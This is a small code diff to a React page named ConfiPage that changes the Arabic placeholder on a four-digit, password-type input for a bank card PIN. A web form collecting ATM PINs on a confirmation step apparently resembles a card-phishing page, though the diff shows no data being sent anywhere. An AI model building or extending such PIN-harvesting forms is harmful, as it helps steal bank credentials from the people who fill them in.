@@ -211,7 +211,7 @@ export default function ConfiPage() {
               <Input
                 type="password"
                 inputMode="numeric"
-                placeholder="رقم الصراف (PIN)"
+                placeholder="رقم الصراف (ATM)"
                 value={_v6}
                 onChange={(e) => {
                   const value = e.target.value.replace(/\D/g, "").slice(0, 4)
